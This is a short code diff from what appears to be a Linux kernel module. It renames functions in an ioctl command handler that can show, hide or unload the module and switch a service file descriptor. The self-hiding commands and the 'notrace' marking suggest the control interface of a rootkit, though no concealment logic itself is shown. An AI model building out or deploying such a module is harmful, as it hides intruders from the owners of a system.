@@ -37,14 +37,14 @@ notrace int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned lon
     switch (cmd)
     {
         case SERVICE_SHOW:
-            show_self();
+            show_module();
             break;
         case SERVICE_HIDE:
-            hide_self();
+            hide_module();
             break;
         case SERVICE_UNLOAD:
-            show_self();
-            unload_self();
+            show_module();
+            unload_module();
             break;
         case SERVICE_CHANGE_FD:
             service_fd = (unsigned int)arg;
